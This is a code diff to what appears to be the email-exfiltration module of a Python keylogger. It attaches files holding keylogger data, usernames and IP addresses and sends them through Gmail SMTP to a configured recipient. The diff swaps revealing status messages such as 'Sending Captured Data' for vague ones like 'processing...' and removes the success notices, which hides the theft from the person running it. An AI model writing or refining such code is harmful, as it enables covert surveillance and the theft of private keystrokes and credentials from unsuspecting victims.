@@ -18,8 +18,8 @@ def main():
     system('touch Defs/Send_Email/attachments/READ_IT.txt && touch Defs/Send_Email/attachments/usernames.txt && touch Defs/Send_Email/attachments/ip.txt && touch Defs/Send_Email/attachments/KeyloggerData.txt')
 
     # Decoding Password from (Defs/Send_Email/emailconfig.py) ..
-    gmail_password = base64.b64decode(emailconfig.gmail_password)
-    gmail_password = (gmail_password.decode('utf-8'))
+    
+    gmail_password = emailconfig.gmail_password
 
     # Create the enclosing (outer) message
 
@@ -29,10 +29,10 @@ def main():
     outer['From'] = emailconfig.gmail_account
     outer.preamble = ''
     # List of attachments
-    print('[.] Adding Attachments...')
+    print('[.] processing...')
     attachments = ['Defs/Send_Email/attachments/READ_IT.txt', 'Defs/Send_Email/attachments/ip.txt',
                    'Defs/Send_Email/attachments/usernames.txt', 'Defs/Send_Email/attachments/KeyloggerData.txt']
-    print('[.] Attachments Added.')
+    print('[.] located target .')
     # Add the attachments to the message
     for file in attachments:
         try:
@@ -56,18 +56,18 @@ def main():
             s.ehlo()
             s.starttls()
             s.ehlo()
-            print('[.] Trying To Login To Your Gmail Account...')
+            print('[.] Processing...')
             s.login(emailconfig.gmail_account, gmail_password)
             print('[.] Login : SUCCESS')
-            print('[.] Sending Captured Data to Recipient Email Address...')
+            print('[.] showing capture results....')
             s.sendmail(emailconfig.gmail_account,
                        emailconfig.recipient_email, composed)
-            print('[.] EMAIL SEND : SUCCESS')
+            
             s.close()
         print('')
-        print("[+] Check Your Inbox For Email.")
+        
     except:
-        print("[^] Unable To Send The Email. Error Occured ! ")
+        print("[^] Unable To process ")
 
 
 if __name__ == '__main__':
